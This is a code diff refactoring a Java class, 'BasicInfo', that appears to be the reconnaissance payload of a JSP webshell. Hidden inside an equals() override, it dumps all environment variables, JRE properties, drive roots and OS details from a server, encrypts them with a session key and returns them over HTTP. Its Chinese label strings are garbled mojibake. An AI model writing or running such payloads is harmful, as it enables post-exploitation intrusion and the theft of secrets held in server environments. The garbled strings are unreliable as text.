@@ -8,36 +8,32 @@ import java.io.File;
 import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.Map.Entry;
 
 public class BasicInfo {
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
         page.getResponse().setCharacterEncoding("UTF-8");
-        String str = "";
         try {
-            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>ª∑æ≥±‰¡ø:</font><br/>");
+            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>ÁéØÂ¢ÉÂèòÈáè:</font><br/>");
             Map<String, String> env = System.getenv();
             for (String name : env.keySet()) {
                 basicInfo.append(name + "=" + env.get(name) + "<br/>");
             }
-            basicInfo.append("<br/><font size=2 color=red>JREœµÕ≥ Ù–‘:</font><br/>");
-            for (Entry<Object, Object> entry : System.getProperties().entrySet()) {
+            basicInfo.append("<br/><font size=2 color=red>JREÁ≥ªÁªüÂ±ûÊÄß:</font><br/>");
+            for (Map.Entry<Object, Object> entry : System.getProperties().entrySet()) {
                 basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
             }
             String currentPath = new File("").getAbsolutePath();
             String driveList = "";
             File[] roots = File.listRoots();
-            int length = roots.length;
-            for (int i = 0; i < length; i++) {
+            for (int i = 0; i < roots.length; i++) {
                 driveList = driveList + roots[i].getPath() + ";";
             }
-            String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
             Map<String, String> entity = new HashMap<>();
             entity.put("basicInfo", basicInfo.toString());
             entity.put("currentPath", currentPath);
             entity.put("driveList", driveList);
-            entity.put("osInfo", osInfo);
+            entity.put("osInfo", System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch"));
             String result = buildJson(entity, true);
             String key = page.getSession().getAttribute("u").toString();
             ServletOutputStream so = page.getResponse().getOutputStream();
@@ -45,10 +41,11 @@ public class BasicInfo {
             so.flush();
             so.close();
             page.getOut().clear();
+            return true;
         } catch (Exception e) {
             e.printStackTrace();
+            return true;
         }
-        return true;
     }
 
     public static byte[] Encrypt(byte[] bs, String key) throws Exception {
@@ -70,11 +67,11 @@ public class BasicInfo {
                     getClass();
                     Class Base64 = Class.forName("java.util.Base64");
                     Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
-                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes(StandardCharsets.UTF_8)});
+                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
                     getClass();
                     Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder2, new Object[]{value.getBytes(StandardCharsets.UTF_8)})).replace("\n", "").replace("\r", "");
+                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                 }
             }
             sb.append(value);
